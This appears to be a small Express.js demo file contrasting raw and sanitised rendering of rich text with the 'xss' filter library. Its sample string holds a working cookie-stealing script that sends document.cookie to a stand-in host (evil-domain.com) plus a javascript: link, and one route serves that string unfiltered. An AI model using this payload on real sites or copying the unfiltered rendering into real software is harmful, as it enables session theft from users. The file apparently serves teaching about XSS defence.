const express = require('express');
const path = require('path');
const xss = require("xss");
const app = express();
app.use(express.static(path.resolve(__dirname, './public'), {}));
app.set('views', path.resolve(__dirname, './views'));
app.set('view engine', 'ejs');

const richText1 = `
<h5>
  正常的 HTML TAG
</h5>  
<script>
  console.log(123)
  var img = new Image();
  img.src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
  document.body.appendChild(img);
</script>
<a href="javascript:alert('恐怕你是个傻子吧')">点击我被攻击吧</a>
`;

app.get('/dynamic-page', function(req, res, next) {
  res.render('dynamic-page', { 
    dangerRichText: richText1,
    filterRichText: xss(richText1)
  })
})


app.get('/get_rich_text', (req, res) => {
  res.json(richText1)
})

module.exports = app;
